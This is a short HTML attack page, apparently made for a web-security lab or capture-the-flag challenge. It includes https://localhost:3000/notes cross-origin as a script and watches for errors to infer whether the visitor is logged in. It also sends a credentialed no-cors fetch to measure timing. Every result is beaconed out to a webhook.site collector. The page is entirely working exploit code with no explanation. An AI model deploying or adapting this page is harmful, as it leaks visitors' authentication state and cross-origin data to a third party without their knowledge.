<!doctype html><html><body><script>
const TARGET='https://localhost:3000', COLLECT='https://5e0f0fb8-5d1c-4ea5-978d-5c3d2ac391a8.webhook.site/log';
function log(k,v){new Image().src=COLLECT+'?'+k+'='+encodeURIComponent(v)+'&t='+Date.now();}
log('D','start');
let jserr='';
window.addEventListener('error', function(e){ jserr=(e.message||'err').slice(0,40); });
const s=document.createElement('script');
s.src=TARGET+'/notes?_='+Date.now();
s.onload=function(){ setTimeout(function(){ log('AUTH', jserr?('UNAUTH:'+jserr):'AUTHED_json_ok'); }, 400); };
s.onerror=function(){ log('AUTH','NETERR_blocked_or_httperr'); };
document.body.appendChild(s);
// also try a credentialed no-cors GET to confirm reachability/timing
(async()=>{const t0=performance.now();try{await fetch(TARGET+'/notes',{mode:'no-cors',credentials:'include',cache:'no-store'});log('reach','ok_'+Math.round(performance.now()-t0));}catch(e){log('reach','throw_'+Math.round(performance.now()-t0));}})();
</script></body></html>
